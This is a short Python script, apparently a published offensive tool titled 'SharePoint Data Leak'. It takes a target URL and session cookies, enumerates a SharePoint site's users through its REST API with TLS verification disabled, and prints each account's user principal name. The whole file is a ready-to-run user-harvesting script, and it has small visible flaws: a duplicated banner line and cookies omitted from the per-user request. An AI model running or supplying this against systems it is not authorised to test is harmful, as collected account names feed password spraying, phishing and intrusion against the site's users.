#!/usr/bin/python3
# _*_ coding: utf-8 _*_


import requests,json,urllib3
import argparse
from cprint import *


urllib3.disable_warnings()

parser = argparse.ArgumentParser()
parser.add_argument('-d','--domain',help='Domain or Site URL', required=True)
parser.add_argument('-c','--cookie',action='append',help='Cookies to request site. ex -c cookie1:value1 -c cookie2:value2', required=True)
args=parser.parse_args()

SiteUsers='/_api/web/siteUsers'
User='/_api/Web/GetUserById({})'
cookie = {}


for c in args.cookie:
    values = c.split(':')
    cookie[values[0]] = values[1]

headers = {
'Accept':'application/json',
'content-type':'application/json;odata=verbose;charset=utf-8'
}

Domain = args.domain

#proxies={'https':'https://localhost:8080'}
session = requests.Session()

def banner():
    cprint.info('SharePoint Data Leak ')
    cprint.info('author: Daniel Vargas')
    cprint.info('author: Daniel Vargas')
    cprint.info('twitter: @Daniel_Vargar_R')
    print('\r')

def get_datauser(id):
    r = session.get(Domain+User.format(id), verify=False,headers=headers)
    j = json.loads(r.text)
    print("\r", end=' ', flush=False)
    username = ''
    if j['UserPrincipalName'] is not None:
        username = j['UserPrincipalName']
    print(username)
    
def get_users():
    r = session.get(Domain+SiteUsers, cookies=cookie, verify=False, headers=headers)
    if r.status_code == 200:
        j = json.loads(r.text)
        values = j['value']
        for u in values:
            #print(u['LoginName'])
            get_datauser(u['Id'])
    else:
        print(r.status_code)



if __name__ == '__main__':
    banner()
    get_users()

